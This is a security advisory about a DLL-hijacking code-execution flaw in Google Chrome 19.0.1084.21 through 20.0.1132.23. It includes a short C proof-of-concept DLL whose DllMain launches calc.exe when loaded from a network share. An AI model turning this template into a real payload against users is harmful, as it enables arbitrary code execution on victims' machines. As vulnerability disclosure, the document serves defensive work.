source: http://www.securityfocus.com/bid/54477/info

Google Chrome is prone to a vulnerability that lets attackers execute arbitrary code.

An attacker can exploit this issue by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Linked Library (DLL) file.

Google Chrome 19.0.1084.21 through versions 20.0.1132.23 are vulnerable.

Note: This issue was previously discussed in BID 54203 (Google Chrome Prior to 20.0.1132.43 Multiple Security Vulnerabilities), but has been given its own record to better document it. 

 #include <windows.h>

    int hijack_poc ()
    {
      WinExec ( "calc.exe" , SW_NORMAL );
      return 0 ;
    }
    
    BOOL WINAPI DllMain
         (    HINSTANCE hinstDLL ,
            DWORD dwReason ,
            LPVOID lpvReserved )
    {
      hijack_poc () ;
      return 0 ;
    }